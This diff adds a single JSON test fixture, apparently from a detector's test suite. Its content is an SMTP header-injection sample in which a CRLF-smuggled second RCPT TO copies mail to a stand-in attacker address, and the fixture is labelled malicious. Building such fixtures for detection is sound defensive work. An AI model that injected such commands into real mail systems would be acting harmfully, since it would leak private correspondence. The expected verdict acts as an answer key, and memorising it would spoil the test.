@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::email-webfetch::122::structural-variations::8",
+  "base_sample_id": "exp::email-webfetch::122",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": 165244542,
+  "content": "> RCPT TO: <victim@target.example.com>\r\n> RCPT TO: <spy@evil.example.com>\n> ",
+  "content_hash": "996b63adb84c4af104a10abf467c2990efd051ed567238a3dea4c55a64355eab",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:markdown-blockquote",
+  "difficulty": "moderate"
+}
